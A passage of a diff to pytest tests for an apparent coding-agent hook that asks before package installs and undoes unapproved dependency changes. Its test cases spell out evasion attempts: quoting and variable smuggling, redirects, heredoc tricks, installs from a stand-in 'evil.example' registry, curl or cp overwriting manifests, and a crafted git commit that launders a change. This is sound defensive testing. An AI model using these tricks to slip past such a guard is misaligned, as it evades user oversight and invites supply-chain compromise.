-        'npm install "--no-audit #" left-pad',
-        ask=True,
-    ),
-    BashCase(
-        "quoted separator in a global flag",
-        "bun --cwd '--help; ' i left-pad",
-        ask=True,
-    ),
-    BashCase(
-        "install inside double-quoted sh -c",
-        'sh -c "npm install --no-audit"',
-        ask=False,
-    ),
-    BashCase(
-        "install between commands inside sh -c",
-        "sh -c 'echo a; npm install --no-audit; echo b'",
-        ask=False,
-    ),
-    BashCase(
-        "quoted flag inside a double-quoted command",
-        "ssh host \"npm install '--no-audit'\"",
-        ask=False,
-    ),
-    BashCase(
-        "apostrophe in an earlier quoted word",
-        'echo "it\'s" && npm install --no-audit',
-        ask=False,
-    ),
-    BashCase("install inside sh -c", "sh -c 'npm install --no-audit'", ask=False),
-    BashCase(
-        "install inside bash -lc after cd",
-        'bash -lc "cd app && npm install --no-audit"',
-        ask=False,
-    ),
-    BashCase(
-        "quoted phrase that ends in a manager and a word",
-        'git commit -m "brew update"',
-        ask=False,
-    ),
-    BashCase("quoted phrase searched for", 'rg "bun test" .', ask=False),
-    # Flags, redirections and values before the subcommand.
-    BashCase(
-        "registry flag before the subcommand",
-        "npm --registry=https://evil.example install",
-        ask=True,
-    ),
-    BashCase(
-        "registry flag with a separate value",
-        "npm --registry https://evil.example install",
-        ask=True,
-    ),
-    BashCase(
-        "userconfig flag before the subcommand",
-        "npm --userconfig=/tmp/evil.npmrc install",
-        ask=True,
-    ),
-    BashCase(
-        "bun config flag before the subcommand",
-        "bun --config=/tmp/evil.toml install",
-        ask=True,
-    ),
-    BashCase(
-        "pnpm config flag before the subcommand",
-        "pnpm --config.registry=https://evil.example install",
-        ask=True,
-    ),
-    BashCase("unknown flag before the subcommand", "pnpm -C app install", ask=True),
-    BashCase("vetted flag before the subcommand", "npm --offline install", ask=False),
-    BashCase(
-        "vetted flag and value before the subcommand",
-        "npm --prefix app --silent install --no-audit",
-        ask=False,
-    ),
-    BashCase("flag value from a variable", "pnpm --filter $PKG install", ask=True),
-    BashCase(
-        "redirect between manager and subcommand",
-        "npm 2>/dev/null install left-pad",
-        ask=True,
-    ),
-    BashCase(
-        "bare redirect between manager and subcommand",
-        "bun > out.log i left-pad",
-        ask=True,
-    ),
-    BashCase(
-        "vetted install with a redirect before it",
-        "pnpm 2>&1 install --frozen-lockfile",
-        ask=False,
-    ),
-    BashCase(
-        "flag value named like a manager",
-        "npm --prefix tools/brew install left-pad",
-        ask=True,
-    ),
-    BashCase(
-        "flag value named like bundle",
-        "bun --cwd packages/bundle i left-pad",
-        ask=True,
-    ),
-    BashCase(
-        "add behind a manager-named value", "pnpm --dir apps/bun add zod", ask=True
-    ),
-    BashCase(
-        "vetted install behind a manager-named value",
-        "npm --prefix tools/brew install --no-audit",
-        ask=False,
-    ),
-    BashCase("bundle with a gemfile flag", "bundle --gemfile=evil/Gemfile", ask=True),
-    BashCase("bundle with no subcommand", "bundle", ask=False),
-    BashCase("bundle version", "bundle --version", ask=False),
-    BashCase(
-        "bundle with a gemfile variable",
-        "BUNDLE_GEMFILE=x/Gemfile bundle",
-        ask=True,
-    ),
-    BashCase("bundle abbreviation", "bundle i --gemfile=evil/Gemfile", ask=True),
-    BashCase("bundle long abbreviation", "bundle inst --path vendor", ask=True),
-    BashCase("bundle vetted abbreviation", "bundle ins --quiet", ask=False),
-    BashCase("bundle inject abbreviation", "bundle inj rack 1.0", ask=True),
-    BashCase("npm install-test prefix", "npm install-t left-pad", ask=True),
-    BashCase("npm install-test longer prefix", "npm install-tes left-pad", ask=True),
-    BashCase("upper-case manager", "NPM install left-pad", ask=True),
-    BashCase("upper-case manager without packages", "NPM install", ask=False),
-    BashCase(
-        "install after a long run of flags",
-        "npm " + "--x " * 100 + "install",
-        ask=True,
-    ),
-    # Comments and wrapper prefixes in front of text.
-    BashCase(
-        "install named in a trailing comment", "ls # npm install left-pad", ask=False
-    ),
-    BashCase(
-        "manager named in a comment after a flag", "bun test # bun add zod", ask=False
-    ),
-    BashCase("assignment before echo", "FOO=1 echo npm install left-pad", ask=False),
-    BashCase("time before echo", "time echo bun install left-pad", ask=False),
-    BashCase("env before grep", "env LC_ALL=C grep -rn 'bun install' .", ask=False),
-    BashCase("env split string", 'env -S "npm install left-pad"', ask=True),
-    # Files that an install reads or runs.
-    BashCase(
-        "append to a Gemfile",
-        "echo 'gem \"evil\"' >> Gemfile && bundle install",
-        ask=True,
-    ),
-    BashCase("write gems.rb", "printf 'gem \"x\"' | tee gems.rb", ask=True),
-    BashCase("edit a gemspec in place", "sed -i s/a/b/ foo.gemspec", ask=True),
-    BashCase(
-        "write a registry into .npmrc",
-        "printf 'registry=https://evil.example/\\n' > .npmrc && npm install",
-        ask=True,
-    ),
-    BashCase("write bunfig.toml", "echo '[install]' > bunfig.toml", ask=True),
-    BashCase(
-        "write .pnpmfile.cjs", "echo 'module.exports={}' > .pnpmfile.cjs", ask=True
-    ),
-    BashCase(
-        "write pnpm-workspace.yaml",
-        "echo 'packages: []' > pnpm-workspace.yaml && pnpm install",
-        ask=True,
-    ),
-    BashCase("read a Gemfile", "cat Gemfile && bundle exec rake", ask=False),
-    BashCase("read .npmrc", "cat .npmrc | grep registry", ask=False),
-    # Other ways to change a manifest from the shell.
-    BashCase("copy over package.json", "cp /tmp/evil.json package.json", ask=True),
-    BashCase(
-        "move over package.json", "mv p.tmp package.json && npm install", ask=True
-    ),
-    BashCase(
-        "download package.json",
-        "curl -sSL https://x.test/package.json -o package.json",
-        ask=True,
-    ),
-    BashCase("wget a manifest", "wget -O Cargo.toml https://x.test/c", ask=True),
-    BashCase("rsync a lockfile", "rsync -a other/bun.lock bun.lock", ask=True),
-    BashCase("patch a manifest", "patch package.json < deps.diff", ask=True),
-    BashCase("npm pkg set", "npm pkg set dependencies.evil=1.0.0 && npm i", ask=True),
-    BashCase("pnpm pkg set", "pnpm pkg set dependencies.evil=1.0.0", ask=True),
-    BashCase("npm pkg get", "npm pkg get name version", ask=False),
-    BashCase("copy something else", "cp src/main.ts /tmp/main.ts", ask=False),
-    BashCase("fetch an API", "curl -s https://example.com/api -o out.json", ask=False),
-    # Commands that take long to match are cut off and ask.
-    BashCase(
-        "long run of redirects",
-        "echo " + ">" * 25_000 + "; npm install left-pad",
-        ask=True,
-    ),
-    BashCase(
-        "repeated interpreter flags",
-        "npm install left-pad # " + "bun -e " * 500,
-        ask=True,
-    ),
-    BashCase(
-        "copy a manifest into a directory",
-        "cp package.json bun.lock $d/ && cd $d && bun install --frozen-lockfile",
-        ask=False,
-    ),
-    BashCase(
-        "regex alternation inside quotes",
-        "grep -n 'node --test\\|bun test\\|foo' Makefile",
-        ask=False,
-    ),
-    # Redirections glued to a word and continuation lines inside one.
-    BashCase(
-        "redirect glued to the subcommand",
-        "npm install>/dev/null left-pad",
-        ask=True,
-    ),
-    BashCase("redirect glued to an alias", "bun i>/dev/null left-pad", ask=True),
-    BashCase(
-        "vetted install with a glued redirect",
-        "bun install --frozen-lockfile>log",
-        ask=False,
-    ),
-    BashCase(
-        "continuation inside the manager name",
-        "n\\\npm install left-pad",
-        ask=True,
-    ),
-    BashCase(
-        "continuation inside the subcommand",
-        "bun inst\\\nall left-pad",
-        ask=True,
-    ),
-    # A variable in a script path asks only when it could supply a subcommand.
-    BashCase(
-        "script under an assigned variable",
-        "S=/tmp/scratch; bun $S/shoot.ts out",
-        ask=False,
-    ),
-    BashCase(
-        "script under a variable assigned from another",
-        "S=/tmp/s\nD=$S/design\nbun $D/build.mjs $D 1024",
-        ask=False,
-    ),
-    BashCase("script under TMPDIR", 'bun "$TMPDIR/probe.ts" $PORT', ask=False),
-    BashCase("script under a quoted variable", 'bun "$X/run.ts"', ask=False),
-    BashCase("script with a literal directory", "bun scripts/$f.ts", ask=False),
-    BashCase("script with a literal prefix", "bun render-$v.ts out", ask=False),
-    BashCase(
-        "script after a heredoc that looks like shell",
-        "S=/tmp/s\ncat > $S/x.ts <<'EOF'\nconst k = ['S']; x.source\nEOF\nbun $S/x.ts",
-        ask=False,
-    ),
-    BashCase("variable assigned a phrase", 'S="add left-pad"; bun $S/x', ask=True),
-    BashCase("variable assigned a flag", "S=--cwd=; bun $S/tmp add left-pad", ask=True),
-    BashCase("variable from read", "S=/t; read S; bun $S/x", ask=True),
-    BashCase(
-        "variable from a loop",
-        "S=/t; for S in add; do bun $S/x left-pad; done",
-        ask=True,
-    ),
-    BashCase("variable from eval", "S=/t; eval 'S=\"add x\"'; bun $S/x", ask=True),
-    BashCase(
-        "variable from a quoted eval", "S=/t; e''val 'S=\"add x\"'; bun $S/x", ask=True
-    ),
-    BashCase(
-        "variable the shell sets",
-        "REPLY=/t; read <<< 'add left-pad'; bun $REPLY/x",
-        ask=True,
-    ),
-    BashCase(
-        "variable set again inside a heredoc for bash",
-        "S=/t\nbash <<'EOF'\nS='add left-pad'\nbun $S/x\nEOF",
-        ask=True,
-    ),
-    BashCase(
-        "escaped variable for an inner shell", 'S=/t; sh -c "bun \\$S/x"', ask=True
-    ),
-    BashCase("unknown variable in a path", "bun $X/y left-pad", ask=True),
-    BashCase("unknown variable alone", "bun $X left-pad", ask=True),
-    BashCase("quoted variable then add", 'bun "$X/y" add left-pad', ask=True),
-    BashCase("quoted variable then install", 'bun "$X/y" install', ask=True),
-    BashCase("prefix of a subcommand", "bun a$X left-pad", ask=True),
-    BashCase(
-        "literal directory as a flag value", "bun --cwd dir/$X add left-pad", ask=True
-    ),
-    # Quotes that close within the command.
-    BashCase("manager in a quoted search", 'pgrep -fl "bun "', ask=False),
-    BashCase(
-        "manager as a repository name",
-        'gh search issues --repo oven-sh/bun "http client"',
-        ask=False,
-    ),
-    BashCase(
-        "manager in a grep alternation",
-        'grep -n "make\\|prettier\\|bun " Makefile',
-        ask=False,
-    ),
-    BashCase(
-        "manager after parentheses in a pattern",
-        "grep -E '^- (Node|Npm)|bun ' notes.md",
-        ask=False,
-    ),
-    BashCase(
-        "manager after a quoted substitution",
-        'pgrep -fl -u "$(id -u)" "node|bun test"',
-        ask=False,
-    ),
-    BashCase(
-        "install in a grep pattern", 'grep "a; npm install x" notes.md', ask=False
-    ),
-    BashCase(
-        "install substituted into a grep pattern",
-        'grep "x$(npm install y)z" notes.md',
-        ask=True,
-    ),
-    BashCase("install in echoed text", 'echo "a; npm install x" | sh', ask=True),
-    BashCase("bun --bun -e", "bun --bun -e 'console.log(1)'", ask=False),
-    BashCase("variable split by IFS", "D=add/left-pad; IFS=/; bun $D/", ask=True),
-    BashCase(
-        "grep after a multi-line quote",
-        "echo 'a\nb'; grep x f; bun add left-pad",
-        ask=True,
-    ),
-    BashCase(
-        "cut quote after a multi-line quote",
-        "echo 'a\nb'; npm install '--no-audit;' left-pad",
-        ask=True,
-    ),
-    BashCase(
-        "cut quote after a comment with an apostrophe",
-        "# don't\nbun install '--no-audit;' left-pad",
-        ask=True,
-    ),
-    BashCase(
-        "cut quote after a heredoc with an apostrophe",
-        "cat <<EOF\nit's\nEOF\nnpm install '--no-audit;' left-pad",
-        ask=True,
-    ),
-    BashCase(
-        "shift that looks like a heredoc",
-        'echo $((1<<EOF))\nHOME="add left-pad"\nEOF\nbun $HOME/x',
-        ask=True,
-    ),
-    BashCase(
-        "heredoc without its delimiter line",
-        "S=/t\ncat <<EOF\nS='add left-pad'\nbun $S/x",
-        ask=True,
-    ),
-    BashCase(
-        "brace expansion as a flag value", "bun install --cwd {.,left-pad}", ask=True
-    ),
-    BashCase("glob as a flag value", "bun install --cwd *", ask=True),
-    BashCase(
-        "script after a multi-line quote",
-        "python3 -c \"\nprint('it')\n\"\nS=/t; bun $S/x.ts",
-        ask=False,
-    ),
-    BashCase(
-        "long chain of assignments",
-        "".join(f"A{i}=$A{i + 1}; " for i in range(5_000)) + "A5000=/x; bun $A0/ add",
-        ask=False,
-    ),
-    BashCase("many heredocs", "cat <<A\nx\nA\n" * 8_000 + "bun $X/ add", ask=True),
-    BashCase("variable assigned an array", "S=(add left-pad); bun $S/x", ask=True),
-    BashCase(
-        "variable read through an escaped name",
-        "S=/t; read \\S <<< 'add left-pad'; bun $S/x",
-        ask=True,
-    ),
-    BashCase(
-        "variable set by printf -v glued to its option",
-        "S=/t; printf -vS 'add left-pad'; bun $S/x",
-        ask=True,
-    ),
-    BashCase(
-        "grep after a quoted separator in an assignment",
-        'FOO="a; grep" bun add left-pad',
-        ask=True,
-    ),
-    BashCase(
-        "echo after a quoted separator in an assignment",
-        'FOO="a; echo" npm install left-pad',
-        ask=True,
-    ),
-    BashCase(
-        "grep pattern after a heredoc inside a quoted substitution",
-        QUOTED_HEREDOC + "grep 'a' f; npm install left-pad",
-        ask=True,
-    ),
-    BashCase(
-        "cut quote after a heredoc inside a quoted substitution",
-        QUOTED_HEREDOC + "npm install '--no-audit;' left-pad",
-        ask=True,
-    ),
-    BashCase(
-        "grep pattern after an escaped backtick",
-        'echo "the \\` char" && grep "x" f; npm install left-pad',
-        ask=True,
-    ),
-)
-
-
-# The hook has 10 s in settings.json and fails open past that, so a pattern whose
+# The hook has 10 s in settings.json and fails open past that, so work whose
 # cost grows faster than its input must fail here. CPU time measures that, and a
 # loaded host stretches wall-clock time without changing it.
 CPU_LIMIT = 2.0
 
 
-def run_hook(payload: Mapping[str, object]) -> tuple[bool, str]:
-    """Run the hook, returning (asked, reason)."""
+@pytest.fixture(autouse=True)
+def state_home(
+    tmp_path_factory: pytest.TempPathFactory, monkeypatch: pytest.MonkeyPatch
+) -> Path:
+    home = tmp_path_factory.mktemp("state")
+    monkeypatch.setenv("XDG_STATE_HOME", str(home))
+    monkeypatch.delenv("CLAUDE_PROJECT_DIR", raising=False)
+    return home
+
+
+def invoke(payload: Mapping[str, object]) -> dict[str, object] | None:
+    """Run the hook on one event, returning its JSON output, if any."""
     before = resource.getrusage(resource.RUSAGE_CHILDREN)
     result = subprocess.run(
         [sys.executable, str(HOOK)],
@@ -1611,14 +389,19 @@ def run_hook(payload: Mapping[str, object]) -> tuple[bool, str]:
     after = resource.getrusage(resource.RUSAGE_CHILDREN)
     cpu = (after.ru_utime - before.ru_utime) + (after.ru_stime - before.ru_stime)
     assert cpu < CPU_LIMIT, f"the hook used {cpu:.1f} s of CPU"
-    # The hook only ever exits 0 (it prints an ask decision or nothing), so any
-    # non-zero exit is a real failure — a syntax error or crash.
+    # The hook only ever exits 0, so any other exit is a crash.
     assert result.returncode == 0, result.stderr.strip()
+    assert result.stderr == "", result.stderr
     out = result.stdout.strip()
-    if not out:
+    return cast("dict[str, object]", json.loads(out)) if out else None
+
+
+def run_hook(payload: Mapping[str, object]) -> tuple[bool, str]:
+    """Run a PreToolUse event, returning (asked, reason)."""
+    response = invoke(payload)
+    if response is None:
         return False, ""
-    response = cast("dict[str, dict[str, str]]", json.loads(out))
-    decision = response["hookSpecificOutput"]
+    decision = cast("dict[str, str]", response["hookSpecificOutput"])
     assert decision.get("hookEventName") == "PreToolUse", decision
     assert decision.get("permissionDecisionReason"), decision
     return decision["permissionDecision"] == "ask", decision["permissionDecisionReason"]
@@ -1646,14 +429,1084 @@ def test_file_edit(case: Case, tmp_path: Path) -> None:
     check(payload, ask=case.ask)
 
 
-@pytest.mark.parametrize("case", BASH_CASES, ids=[case.label for case in BASH_CASES])
-def test_bash_command(case: BashCase) -> None:
-    payload = {
-        "hook_event_name": "PreToolUse",
-        "tool_name": case.tool,
-        "tool_input": {"command": case.command},
+# Commits made while setting up a test predate the calls under test, as real
+# history does; the hook ignores commits from the second a call starts in.
+OLD_DATE = "2026-01-01T00:00:00+00:00"
+
+LOCK = '{"lockfileVersion": 1, "packages": {}}\n'
+LOCK_WITH_ZOD = '{"lockfileVersion": 1, "packages": {"zod": {}}}\n'
+
+
+def package_json(**dependencies: str) -> str:
+    return json.dumps({"name": "app", "dependencies": dependencies}, indent=2) + "\n"
+
+
+def git(repo: Path, *args: str, date: str | None = OLD_DATE, check: bool = True) -> str:
+    env = {
+        "PATH": "/usr/bin:/bin:/opt/homebrew/bin:/usr/local/bin",
+        "HOME": str(repo),
+        "GIT_CONFIG_NOSYSTEM": "1",
+        "GIT_AUTHOR_NAME": "Test",
+        "GIT_AUTHOR_EMAIL": "test@example.com",
+        "GIT_COMMITTER_NAME": "Test",
+        "GIT_COMMITTER_EMAIL": "test@example.com",
     }
-    check(payload, ask=case.ask)
+    if date is not None:
+        env |= {"GIT_AUTHOR_DATE": date, "GIT_COMMITTER_DATE": date}
+    result = subprocess.run(
+        ["git", "-C", str(repo), *args],
+        capture_output=True,
+        text=True,
+        check=False,
+        env=env,
+    )
+    assert not check or result.returncode == 0, result.stderr
+    return result.stdout
+
+
+class Outcome(NamedTuple):
+    pre: dict[str, object] | None
+    post: dict[str, object] | None
+
+    @property
+    def asked(self) -> bool:
+        if self.pre is None:
+            return False
+        decision = cast("dict[str, str]", self.pre["hookSpecificOutput"])
+        return decision.get("permissionDecision") == "ask"
+
+    @property
+    def message(self) -> str:
+        if self.post is None:
+            return ""
+        if "reason" in self.post:
+            return cast("str", self.post["reason"])
+        specific = cast("dict[str, str]", self.post["hookSpecificOutput"])
+        return specific["additionalContext"]
+
+
+@final
+class Session:
+    """A git repository and the hook events one Claude session sends about it."""
+
+    def __init__(self, root: Path, session_id: str = "session-1") -> None:
+        self.repo = root / "repo"
+        self.repo.mkdir(exist_ok=True)
+        self.session_id = session_id
+        self.count = 0
+
+    def init(self, **files: str) -> Self:
+        _ = git(self.repo, "init", "-q", "-b", "main")
+        self.write(**files)
+        _ = git(self.repo, "add", "-A")
+        _ = git(self.repo, "commit", "-q", "-m", "initial")
+        return self
+
+    def write(self, **files: str) -> None:
+        for name, content in files.items():
+            path = self.repo / name.replace("__", "/")
+            path.parent.mkdir(parents=True, exist_ok=True)
+            _ = path.write_text(content)
+
+    def read(self, name: str) -> str | None:
+        path = self.repo / name
+        return path.read_text() if path.exists() else None
+
+    def event(self, event: str, **fields: object) -> dict[str, object] | None:
+        payload: dict[str, object] = {
+            "session_id": self.session_id,
+            "cwd": str(self.repo),
+            "hook_event_name": event,
+            **fields,
+        }
+        return invoke(payload)
+
+    def start(
+        self, command: str, *, tool: str = "Bash"
+    ) -> tuple[str, dict[str, object] | None]:
+        self.count += 1
+        call_id = f"toolu_{self.session_id}_{self.count}"
+        pre = self.event(
+            "PreToolUse",
+            tool_name=tool,
+            tool_input={"command": command},
+            tool_use_id=call_id,
+        )
+        return call_id, pre
+
+    def finish(
+        self,
+        call_id: str,
+        command: str,
+        *,
+        tool: str = "Bash",
+        failed: bool = False,
+        response: Mapping[str, object] | None = None,
+    ) -> dict[str, object] | None:
+        if failed:
+            return self.event(
+                "PostToolUseFailure",
+                tool_name=tool,
+                tool_input={"command": command},
+                tool_use_id=call_id,
+                error="Exit code 1",
+            )
+        return self.event(
+            "PostToolUse",
+            tool_name=tool,
+            tool_input={"command": command},
+            tool_use_id=call_id,
+            tool_response=dict(response or {"stdout": "", "stderr": ""}),
+        )
+
+    def run(
+        self,
+        command: str,
+        action: Callable[[], object] | None = None,
+        *,
+        prompted: bool = False,
+        failed: bool = False,
+    ) -> Outcome:
+        """One shell call: PreToolUse, its effect on the repository, then Post.
+
+        `prompted` stands for a permissions.ask rule showing the user a prompt
+        that the user approved.
+        """
+        call_id, pre = self.start(command)
+        if prompted:
+            _ = self.event(
+                "PermissionRequest", tool_name="Bash", tool_input={"command": command}
+            )
+        if action is not None:
+            _ = action()
+        return Outcome(pre, self.finish(call_id, command, failed=failed))
+
+    def batch(
+        self, *calls: tuple[str, str, Mapping[str, object]]
+    ) -> dict[str, object] | None:
+        """The PostToolBatch of calls given as (call id, tool name, tool input)."""
+        return self.event(
+            "PostToolBatch",
+            tool_calls=[
+                {
+                    "tool_name": tool,
+                    "tool_input": dict(tool_input),
+                    "tool_use_id": call_id,
+                    "tool_response": "",
+                }
+                for call_id, tool, tool_input in calls
+            ],
+        )
+
+    def stop(self, background: list[str] | None = None) -> dict[str, object] | None:
+        tasks = [
+            {"id": task, "type": "shell", "status": "running"}
+            for task in background or []
+        ]
+        return self.event("Stop", stop_hook_active=False, background_tasks=tasks)
+
+
+@pytest.fixture
+def session(tmp_path: Path) -> Session:
+    return Session(tmp_path).init(
+        **{"package.json": package_json(react="^19.0.0"), "bun.lock": LOCK}
+    )
+
+
+def add_zod(session: Session) -> Callable[[], None]:
+    def action() -> None:
+        session.write(
+            **{
+                "package.json": package_json(react="^19.0.0", zod="^4.0.0"),
+                "bun.lock": '{"lockfileVersion": 1, "packages": {"zod": {}}}\n',
+            }
+        )
+
+    return action
+
+
+def test_unapproved_shell_change_is_undone(session: Session) -> None:
+    outcome = session.run("bun install zod", add_zod(session))
+    assert not outcome.asked
+    assert outcome.post is not None
+    assert outcome.post["decision"] == "block"
+    assert "package.json adds zod" in outcome.message
+    assert "run exactly the same command again" in outcome.message
+    assert session.read("package.json") == package_json(react="^19.0.0")
+    assert session.read("bun.lock") == LOCK
+    saved = re.search(r"saved in (\S+)\.", outcome.message)
+    assert saved is not None
+    assert "zod" in (Path(saved.group(1)) / "package.json").read_text()
+
+
+def test_rerun_asks_and_approval_keeps_the_change(session: Session) -> None:
+    _ = session.run("bun install zod", add_zod(session))
+    outcome = session.run("bun install zod", add_zod(session))
+    assert outcome.asked
+    assert outcome.pre is not None
+    reason = cast("dict[str, str]", outcome.pre["hookSpecificOutput"])
+    assert "package.json adds zod" in reason["permissionDecisionReason"]
+    assert outcome.post is None
+    assert "zod" in (session.read("package.json") or "")
+    assert not session.run("bun install zod").asked
+
+
+def test_a_different_command_is_still_undone(session: Session) -> None:
+    _ = session.run("bun install zod", add_zod(session))
+    outcome = session.run("bun install  zod", add_zod(session))
+    assert not outcome.asked
+    assert "adds zod" in outcome.message
+    assert "zod" not in (session.read("package.json") or "")
+
+
+def test_a_prompted_command_keeps_its_change(session: Session) -> None:
+    outcome = session.run("bun add zod", add_zod(session), prompted=True)
+    assert outcome.post is None
+    assert "zod" in (session.read("package.json") or "")
+
+
+def test_a_denied_prompt_approves_nothing(session: Session) -> None:
+    # The user denies the prompt, so the call never runs and has no Post.
+    _ = session.start("bun add zod")
+    _ = session.event(
+        "PermissionRequest", tool_name="Bash", tool_input={"command": "bun add zod"}
+    )
+    _ = session.stop()
+    outcome = session.run("bun add zod", add_zod(session))
+    assert "adds zod" in outcome.message
+    assert "zod" not in (session.read("package.json") or "")
+
+
+def test_a_failed_command_is_checked(session: Session) -> None:
+    outcome = session.run("bun install zod && false", add_zod(session), failed=True)
+    assert outcome.post is not None
+    assert "hookSpecificOutput" in outcome.post
+    assert "adds zod" in outcome.message
+    assert "zod" not in (session.read("package.json") or "")
+
+
+def test_a_version_change_is_undone(session: Session) -> None:
+    outcome = session.run(
+        "bun update",
+        lambda: session.write(**{"package.json": package_json(react="^19.2.0")}),
+    )
+    assert "changes react" in outcome.message
+    assert session.read("package.json") == package_json(react="^19.0.0")
+
+
+@pytest.mark.parametrize(
+    "command",
+    ["echo hi", "bun install", "bun test"],
+)
+def test_commands_that_change_no_dependency_are_silent(
+    session: Session, command: str
+) -> None:
+    outcome = session.run(
+        command,
+        lambda: session.write(
+            **{"bun.lock": '{"lockfileVersion": 2}\n', "src__index.ts": "export {}\n"}
+        ),
+    )
+    assert outcome == Outcome(None, None)
+    assert session.read("bun.lock") == '{"lockfileVersion": 2}\n'
+
+
+def test_reformatting_package_json_is_silent(session: Session) -> None:
+    compact = json.dumps({"dependencies": {"react": "^19.0.0"}, "name": "app"})
+    outcome = session.run(
+        "prettier --write package.json",
+        lambda: session.write(**{"package.json": compact}),
+    )
+    assert outcome == Outcome(None, None)
+
+
+def test_removing_a_dependency_is_silent(session: Session) -> None:
+    outcome = session.run(
+        "bun remove react",
+        lambda: session.write(**{"package.json": package_json()}),
+    )
+    assert outcome == Outcome(None, None)
+
+
+def test_a_new_manifest_is_deleted_with_its_lockfile(session: Session) -> None:
+    def action() -> None:
+        session.write(
+            **{
+                "tools__package.json": package_json(playwright="1.50.0"),
+                "tools__bun.lock": LOCK,
+            }
+        )
+
+    outcome = session.run("cd tools && bun add playwright", action)
+    assert "tools/package.json adds playwright (new file)" in outcome.message
+    assert "deleted" in outcome.message
+    assert session.read("tools/package.json") is None
+    assert session.read("tools/bun.lock") is None
+
+
+def test_a_workspace_root_lockfile_is_restored(session: Session) -> None:
+    def action() -> None:
+        session.write(
+            **{
+                "packages__web__package.json": package_json(zod="^4.0.0"),
+                "bun.lock": '{"lockfileVersion": 1, "packages": {"zod": {}}}\n',
+            }
+        )
+
+    session.write(**{"packages__web__package.json": package_json()})
+    outcome = session.run("bun install --filter web zod", action)
+    assert "packages/web/package.json adds zod" in outcome.message
+    assert session.read("packages/web/package.json") == package_json()
+    assert session.read("bun.lock") == LOCK
+
+
+def test_scratch_directories_are_not_watched(session: Session, tmp_path: Path) -> None:
+    scratch = tmp_path / "scratch"
+    scratch.mkdir()
+
+    def action() -> None:
+        _ = (scratch / "package.json").write_text(package_json(playwright="1.50.0"))
+
+    outcome = session.run(f"cd {scratch} && bun add playwright", action)
+    assert outcome == Outcome(None, None)
+    assert (scratch / "package.json").exists()
+
+
+def test_an_edit_between_calls_is_kept(session: Session) -> None:
+    _ = session.run("echo before")
+    session.write(**{"package.json": package_json(react="^19.0.0", zod="^4.0.0")})
+    outcome = session.run("echo after")
+    assert outcome == Outcome(None, None)
+    assert "zod" in (session.read("package.json") or "")
+
+
+@pytest.fixture
+def branched(session: Session) -> Session:
+    _ = git(session.repo, "checkout", "-q", "-b", "upgrade")
+    session.write(**{"package.json": package_json(react="^19.0.0", zod="^4.0.0")})
+    _ = git(session.repo, "commit", "-qam", "add zod")
+    _ = git(session.repo, "tag", "v2")
+    _ = git(session.repo, "checkout", "-q", "main")
+    return session
+
+
+@pytest.mark.parametrize(
+    "args",
+    [
+        ("checkout", "-q", "upgrade"),
+        ("checkout", "-q", "v2"),
+        ("merge", "-q", "--ff-only", "upgrade"),
+        ("cherry-pick", "upgrade"),
+        ("restore", "--source=upgrade", "package.json"),
+    ],
+)
+def test_git_moving_to_history_is_silent(
+    branched: Session, args: tuple[str, ...]
+) -> None:
+    outcome = branched.run(
+        f"git {' '.join(args)}", lambda: git(branched.repo, *args, date=None)
+    )
+    assert outcome == Outcome(None, None), outcome.message
+    assert "zod" in (branched.read("package.json") or "")
+
+
+def test_reset_to_a_deleted_branch_is_silent(branched: Session) -> None:
+    _ = git(branched.repo, "checkout", "-q", "upgrade")
+    _ = git(branched.repo, "checkout", "-q", "main")
+    _ = git(branched.repo, "branch", "-q", "-D", "upgrade")
+    _ = git(branched.repo, "tag", "-d", "v2")
+    outcome = branched.run(
+        "git reset --hard HEAD@{1}",
+        lambda: git(branched.repo, "reset", "-q", "--hard", "HEAD@{1}", date=None),
+    )
+    assert outcome == Outcome(None, None), outcome.message
+
+
+def test_an_empty_fetch_head_does_not_hide_history(branched: Session) -> None:
+    _ = (branched.repo / ".git" / "FETCH_HEAD").write_text("")
+    outcome = branched.run(
+        "git checkout -q upgrade",
+        lambda: git(branched.repo, "checkout", "-q", "upgrade", date=None),
+    )
+    assert outcome == Outcome(None, None), outcome.message
+    assert "zod" in (branched.read("package.json") or "")
+
+
+def test_a_repository_without_commits_is_guarded(tmp_path: Path) -> None:
+    session = Session(tmp_path)
+    _ = git(session.repo, "init", "-q", "-b", "main")
+    outcome = session.run(
+        "bun install zod",
+        lambda: session.write(**{"package.json": package_json(zod="^4.0.0")}),
+    )
+    assert "package.json adds zod (new file)" in outcome.message
+    assert session.read("package.json") is None
+
+
+def test_a_pair_the_tree_holds_is_no_longer_tainted(session: Session) -> None:
+    _ = session.run("bun install zod", add_zod(session))
+    session.write(**{"package.json": package_json(react="^19.0.0", zod="^4.0.0")})
+    _ = git(session.repo, "commit", "-qam", "add zod")
+    assert session.run("echo hi") == Outcome(None, None)
+    _ = git(session.repo, "checkout", "-q", "-b", "old", "HEAD~1")
+    outcome = session.run(
+        "git checkout main",
+        lambda: git(session.repo, "checkout", "-q", "main", date=None),
+    )
+    assert outcome == Outcome(None, None), outcome.message
+    assert "zod" in (session.read("package.json") or "")
+
+
+def test_stash_pop_is_silent(session: Session) -> None:
+    session.write(**{"package.json": package_json(react="^19.0.0", zod="^4.0.0")})
+    _ = git(session.repo, "stash", "-q")
+    outcome = session.run(
+        "git stash pop", lambda: git(session.repo, "stash", "pop", "-q", date=None)
+    )
+    assert outcome == Outcome(None, None), outcome.message
+
+
+def test_add_and_commit_in_one_command_is_caught(session: Session) -> None:
+    def action() -> None:
+        add_zod(session)()
+        _ = git(session.repo, "commit", "-qam", "add zod", date=None)
+
+    outcome = session.run("bun install zod && git commit -am 'add zod'", action)
+    assert "adds zod" in outcome.message
+    assert "also contains the change" in outcome.message
+    assert session.read("package.json") == package_json(react="^19.0.0")
+    staged = git(session.repo, "diff", "--cached", "--name-only")
+    assert "package.json" in staged
+    # An old commit holding the same change cannot explain it once it was undone.
+    tree = git(session.repo, "rev-parse", "HEAD^{tree}").strip()
+    old = git(session.repo, "commit-tree", tree, "-m", "old", date=OLD_DATE).strip()
+    _ = git(session.repo, "branch", "laundry", old)
+    outcome = session.run(
+        "git restore --source=laundry package.json",
+        lambda: git(session.repo, "restore", "--source=laundry", "package.json"),
+    )
+    assert "adds zod" in outcome.message
+    assert "zod" not in (session.read("package.json") or "")
+
+
+def test_a_merge_conflict_is_reported_not_undone(session: Session) -> None:
+    _ = git(session.repo, "checkout", "-q", "-b", "other")
+    session.write(**{"package.json": package_json(react="^19.0.0", vue="^3.0.0")})
+    _ = git(session.repo, "commit", "-qam", "vue")
+    _ = git(session.repo, "checkout", "-q", "main")
+    session.write(**{"package.json": package_json(react="^19.0.0", zod="^4.0.0")})
+    _ = git(session.repo, "commit", "-qam", "zod")
+
+    def merge() -> None:
